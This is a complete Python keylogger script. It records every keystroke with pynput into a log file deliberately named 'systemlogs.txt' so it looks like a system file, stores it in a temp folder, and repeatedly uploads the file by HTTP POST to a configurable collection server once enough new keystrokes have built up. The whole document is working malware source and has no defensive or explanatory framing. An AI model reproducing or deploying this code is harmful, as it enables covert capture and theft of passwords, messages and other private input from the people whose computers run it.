from pynput.keyboard import Key, Listener
import os
from time import sleep
from datetime import datetime
from sys import platform
import requests
import logging
from threading import Thread

# !! SETTINGS !! #
log_sending = True
log_file_path = "systemlogs.txt"  # masquerade it
# !! SETTINGS !! #

def setup_log_path():
    global log_file_path
    if platform.startswith('linux'):
        log_file_path = "/tmp/" + log_file_path
    elif platform.startswith('win32'):
        log_file_path = "C:/Temp/" + log_file_path
    else:
        quit()
    # Create the log file.
    open(log_file_path, 'a').close()


setup_log_path()
logging.basicConfig(filename=(log_file_path), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    logging.info(str(key))


listener = Listener(on_press=on_press)
listener.start()

if log_sending == True:
    # !! SETTINGS !! #
    server_address = "127.0.0.1"
    server_port = 53535
    # Network Traffic control
    sending_schedule_in_seconds = 1
    lines_difference = 10  # Used for sending only when x number of new lines were added to log the file.
    # !! SETTINGS !! #

    def count_lines_in_log_file():
        count = 0
        with open(log_file_path, "r") as log_file:
            for count, line in enumerate(log_file):
                pass
        return count + 1


    def send_log_file():
        url = "http://" + server_address + ":" + str(server_port) + "/logfile/"
        file = {'logfile': open(log_file_path, 'rb')}
        response = requests.post(url, files=file)


    def monitor_log_file():
        # Monitor log file and send only if there is a x amount of new lines.
        while True:
            initial = count_lines_in_log_file()
            sleep(sending_schedule_in_seconds)
            current = count_lines_in_log_file()
            if (current - initial > lines_difference):
                send_log_file()


    monitor_then_send_thread = Thread(target=monitor_log_file)
    monitor_then_send_thread.start()
    monitor_then_send_thread.join()
